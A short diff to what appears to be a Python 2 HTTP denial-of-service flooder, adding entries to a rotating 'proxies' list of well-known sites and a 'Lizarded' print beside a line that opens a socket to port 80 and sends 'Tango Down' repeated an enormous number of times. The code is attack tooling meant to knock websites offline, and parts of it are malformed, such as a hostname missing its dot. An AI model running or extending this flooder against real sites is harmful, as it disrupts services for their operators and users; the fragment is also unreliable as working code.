@@ -23,7 +23,7 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
-proxies = ['www.google.com','www.cloudflare com']
+proxies = ['www.google.com','www.cloudflare com','www.aq.com','www.discord.com']
 prox = itertools.cycle(proxies)
 def inc_counter():
 	global request_counter
@@ -96,6 +96,7 @@ def httpcall(url):
 	except Exception:
 			s.connect((url,80))
 			s.sendall("Tango Down" * 109951162777600)
+			print "Lizarded"
 
 	
 #http caller thread 
